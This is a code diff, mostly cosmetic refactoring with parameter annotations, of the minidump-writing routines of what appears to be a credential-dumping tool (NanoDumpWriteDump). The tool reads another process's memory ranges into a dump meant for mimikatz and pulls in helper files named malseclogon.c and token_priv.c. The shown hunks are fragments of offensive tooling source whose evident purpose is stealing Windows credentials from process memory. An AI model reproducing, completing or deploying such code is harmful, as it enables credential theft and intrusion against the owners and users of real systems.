@@ -5,30 +5,27 @@
 #include "handle.c"
 #include "modules.c"
 #include "syscalls.c"
-#include "debugpriv.c"
+#include "token_priv.c"
 #include "malseclogon.c"
 #endif
 
-void writeat(
-    Pdump_context dc,
-    ULONG32 rva,
-    const PVOID data,
-    unsigned size
-)
+VOID writeat(
+    IN Pdump_context dc,
+    IN ULONG32 rva,
+    IN const PVOID data,
+    IN unsigned size)
 {
     PVOID dst = RVA(
         PVOID,
         dc->BaseAddress,
-        rva
-    );
+        rva);
     memcpy(dst, data, size);
 }
 
 BOOL append(
-    Pdump_context dc,
-    const PVOID data,
-    unsigned size
-)
+    IN Pdump_context dc,
+    IN const PVOID data,
+    IN unsigned size)
 {
     ULONG32 new_rva = dc->rva + size;
     if (new_rva < dc->rva)
@@ -50,8 +47,7 @@ BOOL append(
 }
 
 BOOL write_header(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing header");
     MiniDumpHeader header;
@@ -91,9 +87,8 @@ BOOL write_header(
 }
 
 BOOL write_directory(
-    Pdump_context dc,
-    MiniDumpDirectory directory
-)
+    IN Pdump_context dc,
+    IN MiniDumpDirectory directory)
 {
     BYTE directory_bytes[SIZE_OF_DIRECTORY];
     DWORD offset = 0;
@@ -107,8 +102,7 @@ BOOL write_directory(
 }
 
 BOOL write_directories(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing directory: SystemInfoStream");
     MiniDumpDirectory system_info_directory;
@@ -147,8 +141,7 @@ BOOL write_directories(
 }
 
 BOOL write_system_info_stream(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     MiniDumpSystemInfo system_info;
 
@@ -262,8 +255,7 @@ BOOL write_system_info_stream(
 }
 
 Pmodule_info write_module_list_stream(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing the ModuleListStream");
 
@@ -278,8 +270,7 @@ Pmodule_info write_module_list_stream(
         dc->hProcess,
         important_modules,
         ARRAY_SIZE(important_modules),
-        TRUE
-    );
+        TRUE);
     if (!module_list)
     {
         DPRINT_ERR("Failed to write the ModuleListStream");
@@ -397,9 +388,8 @@ Pmodule_info write_module_list_stream(
 }
 
 BOOL is_important_module(
-    PVOID address,
-    Pmodule_info module_list
-)
+    IN PVOID address,
+    IN Pmodule_info module_list)
 {
     Pmodule_info curr_module = module_list;
     while (curr_module)
@@ -413,9 +403,8 @@ BOOL is_important_module(
 }
 
 PMiniDumpMemoryDescriptor64 get_memory_ranges(
-    Pdump_context dc,
-    Pmodule_info module_list
-)
+    IN Pdump_context dc,
+    IN Pmodule_info module_list)
 {
     PMiniDumpMemoryDescriptor64 ranges_list = NULL;
     PVOID base_address, current_address;
@@ -437,8 +426,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
             mic,
             &mbi,
             sizeof(mbi),
-            NULL
-        );
+            NULL);
         if (!NT_SUCCESS(status))
             break;
 
@@ -509,15 +497,13 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
     }
     DPRINT(
         "Enumearted %ld ranges of memory",
-        number_of_ranges
-    );
+        number_of_ranges);
     return ranges_list;
 }
 
 PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
-    Pdump_context dc,
-    Pmodule_info module_list
-)
+    IN Pdump_context dc,
+    IN Pmodule_info module_list)
 {
     PMiniDumpMemoryDescriptor64 memory_ranges;
     ULONG32 stream_rva = dc->rva;
@@ -526,8 +512,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 
     memory_ranges = get_memory_ranges(
         dc,
-        module_list
-    );
+        module_list);
     if (!memory_ranges)
     {
         DPRINT_ERR("Failed to write the Memory64ListStream");
@@ -601,8 +586,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
             (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
             buffer,
             curr_range->DataSize,
-            NULL
-        );
+            NULL);
         // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
         if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
@@ -613,8 +597,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
                 curr_range->State,
                 curr_range->Protect,
                 curr_range->Type,
-                status
-            );
+                status);
             //return NULL;
         }
         if (!append(dc, buffer, curr_range->DataSize))
@@ -634,8 +617,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
 }
 
 BOOL NanoDumpWriteDump(
-    Pdump_context dc
-)
+    IN Pdump_context dc)
 {
     DPRINT("Writing nanodump");
 
